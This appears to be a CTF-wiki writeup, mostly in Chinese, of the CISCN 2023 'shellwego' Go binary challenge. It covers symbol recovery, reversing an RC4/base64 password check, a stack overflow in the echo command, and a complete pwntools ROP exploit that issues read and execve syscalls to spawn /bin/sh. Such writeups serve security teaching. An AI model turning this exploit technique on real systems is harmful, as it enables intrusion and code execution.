# ciscn2023 shellwego writeup
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



这题是go语言程序 感觉逆向的占比大于pwn...
## 0x1 checksec 查看安全保护

![img](checksec.png)  
没开PIE， 而且可以发现程序是静态链接的

## 0x2 ida 分析
![img](0x2.png)

无符号表，难以分析，尝试利用

## 0x3 恢复符号表
### 0x3-1 查看程序go版本
两种方式： 
1. Shift+F12打开字符串窗口，搜索`go` 可以看到版本信息
2. 在命令行执行 `strings shellwego | grep "go"`

可以看到版本为go1.20.4
![img](0x3-1.png)

### 0x3-2 尝试利用IDA signature库进行比对恢复
> IDA 可以根据选定signature库中的函数签名特征与当前程序各函数进行匹配  从而恢复函数名
1. Shift+F5打开Signatures窗口
2. 右键点击 `Apply new signature...`
3. 点击 `Search` 搜索 `go`
4. 发现只有一个 `go_std` 仅可用于 `go1.10-1.16`， 不可行
![img](0x3-2.png)

### 0x3-3 搜索 `ida go1.20 signature`
发现工具 [GoReSym](https://www.google.com.hk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjk55Gv_qD_AhWgcGwGHSR4BicQFnoECBQQAQ&url=https%3A%2F%2Fgithub.com%2Fmandiant%2FGoReSym&usg=AOvVaw1kELKyeJ37LXczOk3Yd8pk) （也可以试试其他符号恢复方法）

使用：
1. 下载程序 [Release](https://github.com/mandiant/GoReSym/releases/)
2. 执行并生成结果json文件  `GoReSym.exe -t -d -p /path/to/shellwego > output.json`
3. 下载IDA脚本文件 [goresym_rename.py](https://github.com/mandiant/GoReSym/blob/master/IDAPython/goresym_rename.py)
4. IDA 点击 File -> Script File 选择 `goresym_rename.py` 再选择刚才输出的 `output.json` IDA就能自动恢复函数名了

![img](0x3-3.png)

前后对比可以看到恢复效果非常理想

![img](0x3-32.png)

## 0x4 程序分析
### 0x4-1 进入main_main函数，可以看到程序先输出 `ciscnshell$`，再获取输入，然后调用函数 `main_unk_func0b05`
![img](0x4-1.png)

### 0x4-2 进入`main_unk_func0b05`函数
- 发现很多cmp和类似字符串16进制的dword
点击16进制数再按R键，显示字符串  但由于数据是以dword解释的，所以字符串颠倒  
- 尝试执行程序发现输出`Cert Is A Must` 所以先来看cert命令  按照程序流程可见应该还要输入 `nAcDsMic`+`N` 也就是 `nAcDsMicN`  
- 但是如果只输入 `cert nAcDsMicN` 会出现提示 `Missing parameter`， 明显是要三个参数  
- 再看函数流图发现之后去到函数`main_unk_func0b01`
![img](0x4-2.png)

### 0x4-3 进入`main_unk_func0b01`函数
同样方法转换字符串，可以发现大致流程：
1. key="F1nallB1B1rd3K3y"
2. rc4 加密
3. base64 加密
4. 与字符串"JLIX8pbSvYZu/WaG"比较，若相同则认证成功
![img](0x4-3.png)

### 0x4-4 cert me in
很明了了，先base64解密成byte数组， 再用已知key通过rc4解密  最后得到 `S33UAga1n@#!`  
执行程序输入 `cert nAcDsMicN S33UAga1n@#!`， 成功通过验证

### 0x4-5 回到`main_unk_func0b05`函数
尝试执行函数中提到的不同命令，可以`cat flag`但是是假的flag
发现仅echo命令存在可能漏洞（main_unk_func0b04中）

### 0x4-6 进入`main_unk_func0b04`函数
![img](0x4-4.png)
结合动态调试发现：
1. echo后面的单个连续单词长度不能超过0x200
2. 单词会去掉空格拼接起来复制到栈上， 存在栈溢出漏洞
3. 遇到`+`不复制

## 0x5 exploit
直接栈溢出到ret_addr会出现Segmentation Fault，调试分析问题出现在指令`movzx edx, byte ptr [rbx+rax]`  
![img](0x4-5.png)

原因rbx从栈上取了一个地址值，而我们改写了栈使其不再是有效地址值，所以解析的时候会报段错误
绕开方式： 刚好遇到 `+` 不会复制，也就保留原来的值

```python
from pwn import *
context.log_level='debug'

filename = './shellwego'
proc = process(filename)
belf = ELF(filename)

gscript = '''
    b * 0x0000000004C1882
    c
'''
# gdb.attach(proc, gdbscript=gscript)

# gadget 查看pop_ret对，用于构造pop链
poprdi_ret = 0x444fec
poprsi_ret = 0x41e818
poprdx_ret = 0x49e11d
poprax_ret = 0x40d9e6
syscall = 0x40328c

proc.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')

#每个单词长度不超过0x200
#payload具体溢出长度可通过动态调试观察得到
payload = b'echo '+b'h'*0x100+b' '+b'h'*0x103

# 避开影响地址
payload += b'+' * 8

# 调用syscall 0 即read 到0x59FE70 上
# 具体syscall调用规则查看：https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
payload += p64(0xdeadbeefdeadbeef) * 3
payload += p64(poprdi_ret) + p64(0)
payload += p64(poprax_ret) + p64(0)
payload += p64(poprsi_ret) + p64(0x59FE70)
payload += p64(poprdx_ret) + p64(20)
payload += p64(syscall)

#syscall 59 即execve
payload += p64(poprax_ret) + p64(59)
payload += p64(poprdi_ret) + p64(0x59FE70)
payload += p64(poprsi_ret) + p64(0)
payload += p64(poprdx_ret) + p64(0)
payload += p64(syscall)

proc.sendlineafter(b'# ', payload)
proc.send(b"/bin/sh\x00")
proc.interactive()
pause()

```